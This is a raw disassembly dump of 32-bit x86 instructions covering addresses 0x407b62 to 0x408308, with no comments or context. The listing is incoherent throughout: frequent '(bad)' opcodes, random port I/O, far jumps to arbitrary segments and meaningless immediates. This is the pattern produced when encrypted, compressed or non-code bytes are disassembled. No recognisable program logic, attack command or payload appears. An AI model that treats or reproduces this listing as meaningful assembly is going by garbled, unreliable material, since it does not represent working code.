  407b62:	scas   al,BYTE PTR es:[edi]
  407b63:	sbb    al,0xa4
  407b65:	dec    edx
  407b66:	into   
  407b67:	lods   al,BYTE PTR ds:[esi]
  407b68:	es push ebp
  407b6a:	and    eax,0x9f40061d
  407b6f:	jmp    0x407af1
  407b71:	adc    DWORD PTR [ebp-0x5c],esi
  407b74:	cld    
  407b75:	and    eax,0xb18d303a
  407b7a:	dec    edx
  407b7b:	sbb    eax,DWORD PTR [edi]
  407b7d:	push   eax
  407b7e:	jmp    0xa6d0:0xa3b38b33
  407b85:	sbb    ebx,edi
  407b87:	bts    DWORD PTR [edi-0x50f3f37f],edi
  407b8e:	sahf   
  407b8f:	daa    
  407b90:	out    0x78,al
  407b92:	xlat   BYTE PTR ds:[ebx]
  407b93:	out    0x98,al
  407b95:	sbb    ebx,DWORD PTR [esi]
  407b97:	out    dx,ax
  407b99:	pusha  
  407b9a:	sub    al,0xe6
  407b9c:	gs adc edi,ecx
  407b9f:	dec    esi
  407ba0:	int    0xe8
  407ba2:	xchg   edi,eax
  407ba3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ba4:	dec    edi
  407ba5:	bound  edx,QWORD PTR [eax-0xbb2dda1]
  407bab:	jne    0x407bc2
  407bad:	or     DWORD PTR [esi+0x489072a1],0xffffffc0
  407bb4:	(bad)  
  407bb5:	jae    0x407bc5
  407bb7:	or     BYTE PTR [ebx+0x52f4149f],dl
  407bbd:	and    ch,BYTE PTR [eax-0xb4d3faf]
  407bc3:	and    BYTE PTR [esi+0x2],bh
  407bc6:	jmp    0x6c98f8e1
  407bcb:	mov    bh,0xa5
  407bcd:	repnz test DWORD PTR [esi+ecx*8+0x74a5724d],0xb7666109
  407bd9:	lock jmp 0x36919eaa
  407bdf:	pop    es
  407be0:	mov    gs,WORD PTR [ebx+0x28157e17]
  407be6:	pop    edx
  407be7:	add    edi,DWORD PTR [ebp-0x420790c0]
  407bed:	mov    dh,0xf9
  407bef:	dec    edx
  407bf0:	mov    bh,0x44
  407bf2:	aaa    
  407bf3:	(bad)  
  407bf4:	xchg   ebx,eax
  407bf5:	add    ecx,ecx
  407bf7:	pop    esi
  407bf8:	xor    eax,0xdb0ee175
  407bfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bfe:	xor    ebp,edx
  407c00:	fmulp  st(1),st
  407c02:	xchg   ebp,eax
  407c03:	aas    
  407c04:	ficomp DWORD PTR [esi+ecx*1-0x20]
  407c08:	stc    
  407c09:	pop    es
  407c0a:	js     0x407c82
  407c0c:	pop    ds
  407c0d:	mov    eax,0x43f5292
  407c12:	jle    0x407bb0
  407c14:	cmp    eax,0xb508cfd5
  407c19:	xor    eax,0xbbe17fcb
  407c1e:	mov    ecx,0xda730964
  407c23:	add    eax,0xbd29420
  407c28:	loope  0x407bd1
  407c2a:	test   eax,0x2bef623e
  407c2f:	adc    DWORD PTR [ebx+ecx*8],esi
  407c32:	xchg   BYTE PTR [ebp+0x624c6a7e],dh
  407c38:	clc    
  407c39:	jnp    0x407c9e
  407c3b:	jnp    0x407ca6
  407c3d:	scas   eax,DWORD PTR es:[edi]
  407c3e:	es aad 0x6
  407c41:	sbb    eax,0x56225b8b
  407c46:	xor    BYTE PTR [ecx],bh
  407c48:	sahf   
  407c49:	enter  0x533d,0x1d
  407c4d:	mov    ds:0x2f2add79,eax
  407c52:	cdq    
  407c53:	test   esp,0x9f210edc
  407c59:	jmp    0x407c56
  407c5b:	or     BYTE PTR [edx+ebx*8-0x37],ah
  407c5f:	pop    ebx
  407c60:	je     0x407c91
  407c62:	not    BYTE PTR [edi-0x67]
  407c65:	mov    DWORD PTR [edi+0x19],esi
  407c68:	sahf   
  407c69:	je     0x407c50
  407c6b:	pop    es
  407c6c:	xor    ebp,esp
  407c6e:	int3   
  407c6f:	pop    ebx
  407c70:	daa    
  407c71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c72:	mov    esp,0x6ad5d062
  407c77:	cwde   
  407c78:	sub    BYTE PTR [ebp-0x9],ah
  407c7b:	imul   eax,DWORD PTR [ecx],0xffffffd9
  407c7e:	add    al,0xe5
  407c80:	iret   
  407c81:	sbb    bl,BYTE PTR [eax+eiz*1+0x7a08a1d8]
  407c88:	cmp    ebx,eax
  407c8a:	cmp    eax,0x20603b9
  407c8f:	lea    edi,[eax-0x37]
  407c92:	adc    eax,0x992abcf0
  407c97:	bound  edx,QWORD PTR [ebp+0x6470e9e0]
  407c9d:	fdivr  QWORD PTR [esi]
  407c9f:	sub    eax,0xd4c8e15d
  407ca4:	mov    al,ds:0xbdc89f56
  407ca9:	loopne 0x407cef
  407cab:	mov    eax,0x2d23ce67
  407cb0:	mov    ecx,0xfd80a9fe
  407cb5:	lock loopne 0x407c53
  407cb8:	ret    0xac7f
  407cbb:	(bad)  
  407cbc:	dec    ecx
  407cbd:	pop    ecx
  407cbe:	aas    
  407cbf:	ret    
  407cc0:	(bad)  
  407cc1:	cmp    al,0x2d
  407cc3:	and    BYTE PTR [ebx],ch
  407cc5:	mov    ebx,0x84191e0b
  407cca:	xor    edx,DWORD PTR [ecx]
  407ccc:	aad    0xa7
  407cce:	xchg   edi,eax
  407ccf:	lock jge 0x407c60
  407cd2:	inc    esp
  407cd3:	pavgb  mm7,QWORD PTR [ebx-0x14]
  407cd7:	xlat   BYTE PTR ds:[ebx]
  407cd8:	stos   BYTE PTR es:[edi],al
  407cd9:	mov    ch,0x5c
  407cdb:	fsub   QWORD PTR [ebx-0x49]
  407cde:	js     0x407d1f
  407ce0:	nop
  407ce1:	js     0x407c92
  407ce3:	mov    bl,0x2d
  407ce5:	das    
  407ce6:	lock inc ecx
  407ce8:	out    0x4c,eax
  407cea:	(bad)  
  407ceb:	cmc    
  407cec:	rol    BYTE PTR [ebx],1
  407cee:	fld    QWORD PTR [edx-0x131b4ff7]
  407cf4:	pop    ebx
  407cf5:	dec    esp
  407cf6:	sub    DWORD PTR [ebx],0x85af9200
  407cfc:	pop    ecx
  407cfd:	inc    esp
  407cfe:	or     DWORD PTR [ebx],ebx
  407d00:	test   BYTE PTR [edi-0x5c6e8f78],ah
  407d06:	pop    ds
  407d07:	in     eax,0xa2
  407d09:	int    0xb9
  407d0b:	cwde   
  407d0c:	(bad)  
  407d0d:	stc    
  407d0e:	jl     0x407d31
  407d10:	neg    DWORD PTR [edx]
  407d12:	sub    DWORD PTR [ecx+0x1297a27],esi
  407d18:	loop   0x407d2e
  407d1a:	xor    bl,al
  407d1c:	inc    edx
  407d1d:	inc    eax
  407d1e:	xor    al,0x4b
  407d20:	fyl2xp1 
  407d22:	push   ecx
  407d23:	(bad)  
  407d24:	gs or  esp,esp
  407d27:	jmp    0xe16a:0xc31445c1
  407d2e:	in     al,dx
  407d2f:	js     0x407cc8
  407d31:	(bad)  
  407d32:	daa    
  407d33:	sbb    al,0xc7
  407d35:	mov    ds:0xa3295637,eax
  407d3a:	mov    esp,ebx
  407d3c:	jle    0x407d6a
  407d3e:	popa   
  407d3f:	or     BYTE PTR [edx-0x6423ece7],bl
  407d45:	jo     0x407d16
  407d47:	loope  0x407d57
  407d49:	out    dx,al
  407d4a:	lock xor BYTE PTR [esi],al
  407d4d:	fsubr  QWORD PTR [esi+eax*8-0x18304190]
  407d54:	mov    esp,0x4abbeaf6
  407d59:	mov    eax,ds:0x6d711744
  407d5e:	pop    ss
  407d5f:	mov    edi,0xd854baba
  407d64:	fidiv  DWORD PTR [esi]
  407d66:	add    BYTE PTR [ebx],0xd2
  407d69:	pop    ss
  407d6a:	xlat   BYTE PTR ds:[ebx]
  407d6b:	pop    ebx
  407d6c:	mov    al,0x40
  407d6e:	mov    cl,0x66
  407d70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d71:	xchg   ecx,eax
  407d72:	sbb    DWORD PTR [ebx],edi
  407d74:	mov    edx,0xe2331081
  407d79:	xchg   ebp,eax
  407d7a:	adc    ebx,0xffffffb6
  407d7d:	int    0x36
  407d7f:	call   0xab13ee77
  407d84:	pop    ss
  407d85:	inc    edx
  407d86:	dec    edx
  407d87:	mov    esi,DWORD PTR [ebx]
  407d89:	out    0x9a,eax
  407d8b:	call   0xb2a872c6
  407d90:	mov    cs,WORD PTR [eax-0x77c64fcc]
  407d96:	stos   DWORD PTR es:[edi],eax
  407d97:	push   esp
  407d98:	cmp    BYTE PTR [ebx-0x53],0x7d
  407d9c:	pop    ebp
  407d9d:	jp     0x407d5a
  407d9f:	or     eax,0xab697a72
  407da4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407da5:	int    0x17
  407da7:	or     ah,bl
  407da9:	jno    0x407e28
  407dab:	ret    
  407dac:	and    BYTE PTR [eax-0x257f20e3],al
  407db2:	mov    esp,ecx
  407db4:	scas   al,BYTE PTR es:[edi]
  407db5:	ret    0x8d6d
  407db8:	lea    ebp,[ecx-0x30]
  407dbb:	lods   eax,DWORD PTR ds:[esi]
  407dbc:	fild   QWORD PTR [edi]
  407dbe:	(bad)  
  407dbf:	imul   eax,DWORD PTR [esi],0x10
  407dc2:	and    edx,edi
  407dc4:	loop   0x407d8e
  407dc6:	sbb    ecx,esp
  407dc8:	fs (bad) 
  407dcb:	or     DWORD PTR [ebx+0x67],0x7b85ef00
  407dd2:	push   ecx
  407dd3:	mov    BYTE PTR [ebp-0x78ba721],0x12
  407dda:	jl     0x407db7
  407ddc:	aad    0xd7
  407dde:	dec    eax
  407ddf:	int    0x2c
  407de1:	(bad)  
  407de2:	sub    eax,0xe70ab1e5
  407de7:	imul   edx,DWORD PTR [edi+0x1070fb26],0x75
  407dee:	mov    al,ds:0x1f82d25a
  407df3:	nop
  407df4:	lods   al,BYTE PTR ds:[esi]
  407df5:	mov    esp,0x9c93a28b
  407dfa:	inc    eax
  407dfb:	dec    esp
  407dfc:	cmp    BYTE PTR [edx+0x4d64521d],dl
  407e02:	nop
  407e03:	mov    esi,0x5091ec0c
  407e08:	test   DWORD PTR [esi-0x5dc0b754],edx
  407e0e:	jne    0x407dde
  407e10:	cmp    eax,0x9719c89e
  407e15:	stos   BYTE PTR es:[edi],al
  407e16:	jno    0x407dcb
  407e18:	cmp    dl,BYTE PTR [ebx]
  407e1a:	inc    edi
  407e1b:	out    dx,eax
  407e1c:	arpl   WORD PTR [ebx-0x41],di
  407e1f:	mov    ah,0xaf
  407e21:	popf   
  407e22:	test   eax,0x3fa965df
  407e27:	cli    
  407e28:	mov    ds:0xd98e6c55,al
  407e2d:	sub    al,0xb9
  407e2f:	dec    esp
  407e30:	or     ah,BYTE PTR [edx]
  407e32:	loop   0x407dc7
  407e34:	push   edi
  407e35:	and    dl,BYTE PTR [edx+0x1c]
  407e38:	(bad)  
  407e39:	mov    ds:0xd71529db,eax
  407e3e:	in     eax,0x1c
  407e40:	add    BYTE PTR [esi],bh
  407e42:	cmp    ebp,edx
  407e44:	and    esp,DWORD PTR [eax-0x1e52302]
  407e4a:	sbb    BYTE PTR [ecx],cl
  407e4c:	rcl    BYTE PTR [ebx],cl
  407e4e:	dec    ebp
  407e4f:	retf   
  407e50:	bound  esp,QWORD PTR [edi]
  407e52:	lock mov ebx,esp
  407e55:	push   esp
  407e56:	jno    0x407e93
  407e58:	lea    esi,[ecx-0x6f]
  407e5b:	dec    ebp
  407e5c:	mov    ch,0x2c
  407e5e:	cmp    DWORD PTR [ecx],0xc
  407e61:	(bad)  
  407e62:	std    
  407e63:	scas   eax,DWORD PTR es:[edi]
  407e64:	outs   dx,BYTE PTR ds:[esi]
  407e65:	inc    edx
  407e66:	sbb    eax,0xc62c8898
  407e6b:	test   DWORD PTR [esi-0x3b],0xc03aac86
  407e72:	mov    edx,0x4c8efd86
  407e77:	(bad)  
  407e78:	and    ecx,edi
  407e7a:	(bad)  
  407e7b:	into   
  407e7c:	hlt    
  407e7d:	push   ebx
  407e7e:	and    eax,0xd7f8398a
  407e83:	out    0x94,al
  407e85:	mov    esp,0x6aa9566e
  407e8a:	adc    eax,0x9543357e
  407e8f:	sbb    BYTE PTR [esi+0x56],ah
  407e92:	pop    ebp
  407e93:	add    BYTE PTR ds:0xf2c7f0df,dh
  407e99:	popf   
  407e9a:	cmc    
  407e9b:	rcl    DWORD PTR [esi-0x6],0xeb
  407e9f:	pusha  
  407ea0:	adc    eax,0xb45b39ad
  407ea5:	inc    eax
  407ea6:	fwait
  407ea7:	int    0x98
  407ea9:	stos   BYTE PTR es:[edi],al
  407eaa:	imul   ebp,DWORD PTR [edx+esi*4],0xffffff9c
  407eae:	popa   
  407eaf:	daa    
  407eb0:	int    0x73
  407eb2:	ins    DWORD PTR es:[edi],dx
  407eb3:	es jne 0x407ef5
  407eb6:	fwait
  407eb7:	mov    bl,0xb4
  407eb9:	sbb    eax,0x77e2bdcc
  407ebe:	pop    ebx
  407ebf:	and    DWORD PTR [edi+0x1489dd22],esi
  407ec5:	jmp    0xb875:0xfe15044c
  407ecc:	xchg   ecx,eax
  407ecd:	mov    cl,0x9c
  407ecf:	out    0x52,al
  407ed1:	ret    0x8aa2
  407ed4:	add    al,0x81
  407ed6:	sar    DWORD PTR [edi],0x53
  407ed9:	iret   
  407eda:	sub    al,0x81
  407edc:	retf   0xf618
  407edf:	ret    
  407ee0:	(bad)  
  407ee1:	inc    edx
  407ee2:	pop    eax
  407ee3:	outs   dx,DWORD PTR ds:[esi]
  407ee4:	adc    esi,DWORD PTR [ebx+ebp*4+0x16ab3e20]
  407eeb:	retf   
  407eec:	icebp  
  407eed:	mov    DWORD PTR [ebx],edi
  407eef:	std    
  407ef0:	xor    al,0x98
  407ef2:	push   es
  407ef3:	retf   
  407ef4:	jb     0x407e83
  407ef6:	adc    cl,BYTE PTR [edx]
  407ef8:	stos   DWORD PTR es:[edi],eax
  407ef9:	xor    eax,0x92024513
  407efe:	outs   dx,DWORD PTR ds:[esi]
  407eff:	pop    ebp
  407f00:	sbb    al,0xb7
  407f02:	adc    esi,ebx
  407f04:	add    DWORD PTR [eax-0x44abd0bc],edx
  407f0a:	jae    0x407ec8
  407f0c:	leave  
  407f0d:	xchg   edi,eax
  407f0e:	in     eax,dx
  407f0f:	repnz mov esp,0x8a1d29b7
  407f15:	dec    ecx
  407f16:	iret   
  407f17:	sub    esp,esp
  407f19:	ss and esi,eax
  407f1c:	push   ecx
  407f1d:	ret    0xf49c
  407f20:	mov    ah,0x7d
  407f22:	mov    ecx,0xf8c2aae5
  407f27:	ins    DWORD PTR es:[edi],dx
  407f28:	sbb    esp,DWORD PTR [esi-0x46821085]
  407f2e:	or     al,0x9e
  407f30:	push   ds
  407f31:	js     0x407f3e
  407f33:	fnstsw WORD PTR [ecx+0xe]
  407f36:	xor    esi,edx
  407f38:	cwde   
  407f39:	cmp    ebx,eax
  407f3b:	hlt    
  407f3c:	mov    ecx,0xf9680f87
  407f41:	jecxz  0x407ecf
  407f43:	xchg   BYTE PTR ds:[edi-0x35d059fc],dh
  407f4a:	fwait
  407f4b:	arpl   ax,si
  407f4d:	xchg   esp,eax
  407f4e:	push   es
  407f4f:	(bad)  
  407f50:	xchg   ebp,eax
  407f51:	inc    eax
  407f52:	push   0xffffffa9
  407f54:	outs   dx,BYTE PTR ds:[esi]
  407f55:	sub    al,0x6e
  407f57:	mov    ch,0xbd
  407f59:	in     al,dx
  407f5a:	dec    esi
  407f5b:	pop    esp
  407f5c:	stos   DWORD PTR es:[edi],eax
  407f5d:	pushf  
  407f5e:	dec    esp
  407f5f:	call   DWORD PTR [edx-0x5f]
  407f62:	xchg   esp,eax
  407f63:	inc    ebx
  407f64:	add    eax,0xe2b21d06
  407f69:	fsubr  QWORD PTR [ebp-0x61]
  407f6c:	test   al,0xef
  407f6e:	push   edx
  407f6f:	sub    al,0xf9
  407f71:	push   edx
  407f72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f73:	rol    ch,1
  407f75:	aas    
  407f76:	mov    eax,ds:0xe4da347a
  407f7b:	scas   eax,DWORD PTR es:[edi]
  407f7c:	or     esp,DWORD PTR [eax+0x5930a10f]
  407f82:	hlt    
  407f83:	sar    esi,0x31
  407f86:	ins    DWORD PTR es:[edi],dx
  407f87:	xchg   edi,eax
  407f88:	xor    bl,BYTE PTR [ecx-0x2eba3353]
  407f8e:	mov    eax,ds:0xaf970918
  407f93:	into   
  407f94:	arpl   cx,bp
  407f96:	addr16 mov ecx,0xd0d6f5ed
  407f9c:	es cmp eax,0xe7510955
  407fa2:	aam    0xd7
  407fa4:	outs   dx,BYTE PTR ds:[esi]
  407fa5:	xchg   esp,eax
  407fa6:	add    bl,ch
  407fa8:	mov    cl,0x8
  407faa:	ja     0x408017
  407fac:	ror    BYTE PTR [esp+eiz*2-0x15],cl
  407fb0:	ins    BYTE PTR es:[edi],dx
  407fb1:	inc    edi
  407fb2:	icebp  
  407fb3:	push   es
  407fb4:	aad    0xbb
  407fb6:	fldenv [edx]
  407fb8:	addr16 int 0x87
  407fbb:	in     al,0x80
  407fbd:	cmp    eax,0x4b30f88a
  407fc2:	xor    DWORD PTR [edx+0x57ebf31a],0x6370d96c
  407fcc:	ds dec eax
  407fce:	and    DWORD PTR [ebp-0x22c1521],0xb35a42bc
  407fd8:	gs imul edi,ebp,0x7de65248
  407fdf:	popf   
  407fe0:	out    dx,eax
  407fe1:	stos   DWORD PTR es:[edi],eax
  407fe2:	mov    ebx,0x39e7103d
  407fe7:	js     0x408001
  407fe9:	sti    
  407fea:	stos   BYTE PTR es:[edi],al
  407feb:	cld    
  407fec:	mov    eax,ds:0xb467bf27
  407ff1:	retf   
  407ff2:	sbb    esi,DWORD PTR [ecx]
  407ff4:	loop   0x407f80
  407ff6:	mov    eax,0x7ad534a6
  407ffb:	retf   
  407ffc:	iret   
  407ffd:	in     eax,dx
  407ffe:	push   cs
  407fff:	and    ebx,0x19b5c61e
  408005:	mov    bl,0x53
  408007:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408008:	inc    esp
  408009:	pop    edx
  40800a:	push   ss
  40800b:	fiadd  DWORD PTR ds:0x40af7668
  408011:	scas   eax,DWORD PTR es:[edi]
  408012:	mov    bl,0x5f
  408014:	sti    
  408015:	dec    eax
  408016:	mov    al,0x6e
  408018:	dec    esi
  408019:	xor    al,0x65
  40801b:	add    BYTE PTR [eax-0x5d],dh
  40801e:	ret    
  40801f:	inc    esi
  408020:	mov    ebx,0x7b0929e
  408025:	jo     0x408059
  408027:	scas   eax,DWORD PTR es:[edi]
  408028:	js     0x408060
  40802a:	(bad)  
  40802b:	scas   al,BYTE PTR es:[edi]
  40802c:	mov    ds:0x78fc241e,al
  408031:	xor    eax,0x17b86d7d
  408036:	fcom   QWORD PTR [ebp+0x77d91f40]
  40803c:	shr    DWORD PTR [edi],1
  40803e:	out    0xf7,eax
  408040:	imul   eax,DWORD PTR [edi-0x303644bf],0x37
  408047:	int    0x76
  408049:	ins    BYTE PTR es:[edi],dx
  40804a:	mov    WORD PTR [ecx+0x6f],ds
  40804d:	jmp    0xd09ba2e3
  408052:	pop    esi
  408053:	daa    
  408054:	aaa    
  408055:	pop    eax
  408056:	sub    ch,bh
  408058:	jge    0x408004
  40805a:	push   esi
  40805b:	aam    0x9a
  40805d:	dec    ebp
  40805e:	shl    ah,1
  408060:	daa    
  408061:	test   DWORD PTR [ebx-0x74],0x6a282723
  408068:	and    esp,DWORD PTR [edx]
  40806a:	adc    BYTE PTR [ebp+ebp*8-0x4e3d33a1],0xea
  408072:	mov    ds:0x10dda45,eax
  408077:	cli    
  408078:	in     eax,0xbc
  40807a:	push   eax
  40807b:	cdq    
  40807c:	sbb    edi,DWORD PTR [ecx]
  40807e:	ret    0x38a4
  408081:	retf   
  408082:	adc    dl,BYTE PTR [esi+0x2e]
  408085:	fcomi  st,st(1)
  408087:	mov    WORD PTR [eax+0x4cf71ff3],cs
  40808d:	aas    
  40808e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40808f:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  408091:	hlt    
  408092:	xor    eax,0x8010580e
  408097:	pushf  
  408098:	sub    al,0xe0
  40809a:	add    dh,bh
  40809c:	and    dl,BYTE PTR [ecx-0x39]
  40809f:	ret    0x357d
  4080a2:	inc    esp
  4080a3:	sahf   
  4080a4:	and    DWORD PTR [edx+0x56],0x33c93234
  4080ab:	push   ebx
  4080ac:	xor    eax,0x3c0e1efe
  4080b1:	lods   eax,DWORD PTR ds:[esi]
  4080b2:	test   DWORD PTR [edx+0x30],ebp
  4080b5:	hlt    
  4080b6:	stc    
  4080b7:	or     ebp,DWORD PTR [ebp+0x75e1a514]
  4080bd:	push   edi
  4080be:	adc    al,0xd8
  4080c0:	daa    
  4080c1:	stos   BYTE PTR es:[edi],al
  4080c2:	aas    
  4080c3:	pop    es
  4080c4:	std    
  4080c5:	mov    cl,BYTE PTR [ecx-0x37]
  4080c8:	inc    eax
  4080c9:	daa    
  4080ca:	mov    cl,0x95
  4080cc:	push   0x8ede1d55
  4080d1:	inc    edx
  4080d2:	sbb    ebp,DWORD PTR [eax]
  4080d4:	dec    ebp
  4080d5:	in     eax,0xb8
  4080d7:	mov    bl,0xc7
  4080d9:	popa   
  4080da:	sub    al,0x64
  4080dc:	fs loop 0x40809c
  4080df:	cmp    cl,bh
  4080e1:	pop    ss
  4080e2:	imul   esi,DWORD PTR [eax+0x40],0xffffffeb
  4080e6:	in     al,dx
  4080e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080e8:	jb     0x4080c4
  4080ea:	cli    
  4080eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080ec:	jmp    0x4080e4
  4080ee:	sub    esp,DWORD PTR [esi]
  4080f0:	scas   al,BYTE PTR es:[edi]
  4080f1:	xor    bh,BYTE PTR [eax-0x3798a8e1]
  4080f7:	xlat   BYTE PTR ds:[ebx]
  4080f8:	out    dx,al
  4080f9:	test   eax,0x74ad3822
  4080fe:	call   0xeddc:0x7f7e082d
  408105:	repnz cli 
  408107:	pop    ds
  408108:	aam    0x66
  40810a:	pop    ecx
  40810b:	cdq    
  40810c:	iret   
  40810d:	xchg   esi,eax
  40810e:	jp     0x408102
  408110:	les    esi,FWORD PTR ds:0xc73bfe6
  408116:	jecxz  0x408184
  408118:	loope  0x4080e3
  40811a:	push   ebx
  40811b:	ror    ebp,0xca
  40811e:	sub    dl,bh
  408120:	pop    ecx
  408121:	adc    bh,ch
  408123:	fwait
  408124:	or     ebx,esi
  408126:	ror    DWORD PTR [eax+0x78],1
  408129:	mov    al,ds:0x64fa496a
  40812e:	out    dx,eax
  40812f:	dec    esp
  408130:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408131:	sub    ch,ah
  408133:	inc    esi
  408134:	xlat   BYTE PTR ds:[ebx]
  408135:	outs   dx,BYTE PTR ds:[esi]
  408136:	pop    edi
  408137:	pop    es
  408138:	lods   eax,DWORD PTR ds:[esi]
  408139:	push   ss
  40813a:	adc    bl,al
  40813c:	pushf  
  40813d:	push   0x72
  40813f:	mov    edx,0xb6525347
  408144:	scas   al,BYTE PTR es:[edi]
  408145:	jecxz  0x40819f
  408147:	push   es
  408148:	push   ebx
  408149:	mov    ds:0xb62c68f2,al
  40814e:	lods   al,BYTE PTR ds:[esi]
  40814f:	nop
  408150:	leave  
  408151:	lea    ebx,gs:[ebx-0x3b8c7b6b]
  408158:	sub    BYTE PTR [ebx-0x10967a1],bl
  40815e:	pushf  
  40815f:	inc    esp
  408160:	test   al,0x91
  408162:	iret   
  408163:	jmp    0xc172bcda
  408168:	pop    eax
  408169:	test   BYTE PTR [edi-0x57],dl
  40816c:	stos   BYTE PTR es:[edi],al
  40816d:	in     eax,0x1e
  40816f:	inc    edx
  408170:	dec    edi
  408171:	dec    ebx
  408172:	lds    eax,FWORD PTR [eax]
  408174:	adc    eax,0x5d617aff
  408179:	jmp    0x8427:0xf38c0a27
  408180:	mov    ebx,0x494cad4e
  408185:	xchg   ecx,eax
  408186:	call   0xa4252cab
  40818b:	mov    edi,0x4a5cb297
  408190:	mov    dl,0x30
  408192:	and    dl,ch
  408194:	cwde   
  408195:	dec    ebp
  408196:	into   
  408197:	loopne 0x4081d7
  408199:	ret    0x382e
  40819c:	neg    cl
  40819e:	pop    esi
  40819f:	imul   esi,DWORD PTR [eax+0x32],0xd4c343c4
  4081a6:	in     eax,0x80
  4081a8:	sbb    eax,0xcd486a07
  4081ad:	and    ecx,DWORD PTR [ebp-0x20]
  4081b0:	add    eax,0xc086ab7e
  4081b5:	popf   
  4081b6:	les    edx,FWORD PTR [esi+eiz*2+0x24fad797]
  4081bd:	xchg   DWORD PTR [edi+0x485274d],esi
  4081c3:	(bad)  
  4081c4:	jl     0x4081e9
  4081c6:	mov    cl,BYTE PTR [eax+eax*8-0x67dfea14]
  4081cd:	inc    ebp
  4081ce:	sub    eax,ebx
  4081d0:	sub    DWORD PTR [ecx+0x18ac3b1f],edx
  4081d6:	mov    BYTE PTR [eax-0x31],bl
  4081d9:	cmp    BYTE PTR [edx+0x78],bh
  4081dc:	mov    ebx,0xd187c78d
  4081e1:	js     0x4081f1
  4081e3:	in     eax,0x3c
  4081e5:	int3   
  4081e6:	stos   BYTE PTR es:[edi],al
  4081e7:	sub    BYTE PTR [esi-0x74],dh
  4081ea:	mov    ah,0xc0
  4081ec:	scas   eax,DWORD PTR es:[edi]
  4081ed:	sbb    al,0x89
  4081ef:	aas    
  4081f0:	xchg   bh,bh
  4081f2:	frstor [ebx+0x458ecb9a]
  4081f8:	lea    esi,[eax]
  4081fa:	jbe    0x4081eb
  4081fc:	pop    eax
  4081fd:	shl    BYTE PTR gs:[edi],1
  408200:	popf   
  408201:	jo     0x408222
  408203:	arpl   bx,bp
  408205:	pusha  
  408206:	fsub   st,st(6)
  408208:	mov    edx,0x3b6c32dc
  40820d:	xor    eax,0x6411a974
  408212:	and    dh,BYTE PTR [edi]
  408214:	dec    edx
  408215:	out    dx,al
  408216:	jno    0x4081a0
  408218:	aad    0x2b
  40821a:	aad    0xbc
  40821c:	stos   DWORD PTR es:[edi],eax
  40821d:	sahf   
  40821e:	inc    edi
  40821f:	push   esi
  408220:	aaa    
  408221:	scas   al,BYTE PTR es:[edi]
  408222:	ret    
  408223:	or     al,0x4d
  408225:	les    ebx,FWORD PTR ds:0x78461dd3
  40822b:	mov    ah,0x61
  40822d:	popa   
  40822e:	retf   0x868e
  408231:	cmc    
  408232:	fadd   st,st(3)
  408234:	bound  ebp,QWORD PTR [eax]
  408236:	scas   eax,DWORD PTR es:[edi]
  408237:	cmp    DWORD PTR [eax-0x40],edi
  40823a:	icebp  
  40823b:	inc    ebp
  40823c:	dec    edi
  40823d:	adc    ebp,DWORD PTR [ecx]
  40823f:	fmul   DWORD PTR [ebx+0x6792c83]
  408245:	clc    
  408246:	jmp    0xb34e8661
  40824b:	lock inc ebx
  40824d:	cmp    al,0x26
  40824f:	sub    al,dl
  408251:	sahf   
  408252:	in     al,dx
  408253:	jns    0x408238
  408255:	std    
  408256:	jmp    0x40821f
  408258:	sbb    BYTE PTR [esi-0x74f7093c],0xa
  40825f:	test   BYTE PTR [edi+0x73],ah
  408262:	bound  ecx,QWORD PTR [esi]
  408264:	je     0x408226
  408266:	ins    BYTE PTR es:[edi],dx
  408267:	xor    edx,0xcd525cb8
  40826d:	and    dh,BYTE PTR [ecx-0x61]
  408270:	leave  
  408271:	(bad)  
  408272:	or     BYTE PTR [eax-0x7c4c5b06],0xf0
  408279:	cld    
  40827a:	add    eax,0xe9e88b5d
  40827f:	xlat   BYTE PTR ds:[ebx]
  408280:	fiadd  WORD PTR [edi+0x67da1094]
  408286:	and    eax,0xa8616de4
  40828b:	cmp    ch,BYTE PTR [edi-0xf]
  40828e:	retf   
  40828f:	add    esp,eax
  408291:	push   ecx
  408292:	push   ebx
  408293:	retf   
  408294:	stos   BYTE PTR es:[edi],al
  408295:	push   esi
  408296:	shl    DWORD PTR [ebx],cl
  408298:	inc    esi
  408299:	test   al,0xd5
  40829b:	sub    eax,0x3cf8c449
  4082a0:	pop    es
  4082a1:	and    al,0x7
  4082a3:	lahf   
  4082a4:	jg     0x4082d6
  4082a6:	(bad)  
  4082a7:	dec    esp
  4082a9:	fild   QWORD PTR [ecx+0x8]
  4082ac:	sub    BYTE PTR [edx+0x2f],bh
  4082af:	aad    0x8c
  4082b1:	mov    al,0x4a
  4082b3:	in     al,0x89
  4082b5:	dec    esi
  4082b6:	cli    
  4082b7:	push   es
  4082b8:	mov    eax,ds:0xdde6167a
  4082bd:	and    DWORD PTR [edx],edx
  4082bf:	sub    eax,0x70145a
  4082c4:	out    0x0,eax
  4082c6:	add    eax,0x6e6cc2b9
  4082cb:	mov    al,ds:0xfaea24fc
  4082d0:	das    
  4082d1:	sub    ebx,edi
  4082d3:	dec    edx
  4082d4:	test   al,0x76
  4082d6:	xchg   edx,eax
  4082d7:	ss out dx,eax
  4082d9:	repnz iret 
  4082db:	inc    esp
  4082dc:	pop    ebp
  4082dd:	mov    ch,0xa0
  4082df:	add    dh,BYTE PTR [edx+ecx*1+0x5bea8895]
  4082e6:	or     dh,BYTE PTR [eax]
  4082e8:	stos   DWORD PTR es:[edi],eax
  4082e9:	dec    eax
  4082ea:	add    bl,ch
  4082ec:	mov    ebp,0xe2ac6b7f
  4082f1:	mov    bl,0x35
  4082f3:	push   ss
  4082f4:	in     al,0x81
  4082f6:	push   esp
  4082f7:	mov    BYTE PTR [esi+0x45],ah
  4082fa:	leave  
  4082fb:	adc    eax,0xb5f6f702
  408300:	rcr    BYTE PTR [ebx-0x1],1
  408303:	xchg   BYTE PTR [ecx-0x42],al
  408306:	add    dh,ch
  408308:	gs js  0x408389
